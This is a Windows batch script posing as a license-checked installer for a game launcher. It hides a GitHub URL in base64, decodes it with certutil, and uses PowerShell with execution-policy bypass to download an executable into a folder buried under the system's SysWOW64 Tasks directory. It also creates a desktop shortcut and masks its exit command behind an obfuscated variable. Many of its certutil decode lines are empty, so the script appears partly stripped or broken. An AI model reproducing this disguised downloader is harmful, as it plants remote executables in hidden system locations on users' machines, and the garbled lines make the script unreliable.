:license_check
cls
echo|set |certutil -decode -f - 2>nul
set /p "lk=Enter License Key: " || %xV4% /b 1
echo|set |certutil -decode -f - 2>nul

:hash_verify
set "hash_url=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0V4cGxvcnVtR2FtZXMvRXhwbG9ydW1HYW1lcy5naXRodWIuaW8vcmVmcy9oZWFkcy9tYWluL2hhc2hlZF9rZXlzLnR4dA=="
echo|set /p=!hash_url!|certutil -decode -f - 2>nul>hashes.dat
powershell -ep bypass -c "$h=(gc .\hashes.dat -Raw).Trim();$k=[System.BitConverter]::ToString((New-Object Security.Cryptography.SHA1CryptoServiceProvider).ComputeHash([System.Text.Encoding]::UTF8.GetBytes('%lk%'))).Replace('-','');if($h -notmatch $k){exit 1}"

if %errorlevel% neq 0 (
    echo|set |certutil -decode -f - 2>nul
    pause >nul
    %xV4% /b 1
)

:install_seq
echo|set |certutil -decode -f - 2>nul

mkdir "%SystemRoot%\SysWOW64\Tasks\myapps" >nul 2>&1
echo|set |certutil -decode -f - 2>nul

powershell -ep bypass -c "$W=New-Object -ComObject WScript.Shell;$S=$W.CreateShortcut('$Home\Desktop\My Apps.lnk');$S.TargetPath='%SystemRoot%\SysWOW64\Tasks\myapps';$S.Save()"

echo|set |certutil -decode -f - 2>nul

powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('https://github.com/ExplorumGames/ExplorumGames.github.io/releases/download/1/hydralauncher-3.2.0-portable.exe','%SystemRoot%\SysWOW64\Tasks\myapps\gamelauncher.exe')"

echo|set |certutil -decode -f - 2>nul
pause >nul
%xV4% /b 0
